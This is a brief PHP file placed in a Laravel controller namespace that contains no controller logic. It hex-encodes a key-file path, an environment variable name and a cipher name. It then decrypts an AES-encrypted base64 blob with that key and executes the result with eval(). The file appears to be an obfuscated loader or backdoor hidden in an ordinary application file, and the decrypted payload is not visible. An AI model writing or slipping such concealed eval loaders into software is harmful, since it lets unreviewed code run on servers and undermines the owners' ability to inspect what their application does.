<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('e42k+EWgAOCmSgs/6bG3sg==');

$c=base64_decode(

'Gz2PHd5w+JuudcCPlXg6p/CENaTUCs0IwBSC/BPYKXHQ5taaeYeTjW0A970MtKinYg5zImbNgUG8' .
'sbhc2fFsSbJEgxaDiaYGpf7agbTFfYBJ0Wf/dD4acA3gkHittdzUuFVp4IDzyVZMJzGrJOV1bM4A' .
'ZupnUEjBvrZKnuXHML/R6yQOENGy2QP7H4ocYG+K9Hg+MMdNbbskXJv8BOoKszv5exLmvAT7SNjh' .
'HSu6OUT3Sq2NN4qX6SbjA92ULurg1gIGMACrQj2p0Z+0GPBRwo/Qc3ZYl9NnVp5hIWwBzMf6B4WY' .
'cd89MM72fnBgTOEtyv5Yf53M/oqzNLAI6TLmS2H9XRYEjkGDbi4It57nzDljBFxStqnWPvgQv11g' .
'Sm+y1qHDhk52FdqKfyH5b66glg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

